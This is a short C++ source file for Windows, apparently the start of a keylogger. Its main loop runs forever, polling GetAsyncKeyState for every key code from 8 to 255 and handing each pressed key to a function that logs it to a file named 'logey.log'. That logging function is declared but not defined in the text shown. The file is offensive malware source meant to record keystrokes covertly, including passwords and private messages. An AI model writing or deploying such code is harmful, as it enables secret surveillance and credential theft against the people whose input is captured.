#include <iostream>
#include <Windows.h>

using namespace std;

void keys(int key, char *filename);

int main()
{
	
	while (true) // infinite loop
	{
		for (int i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				keys(i, "logey.log");
			}
		}
	}

	return 0;
}
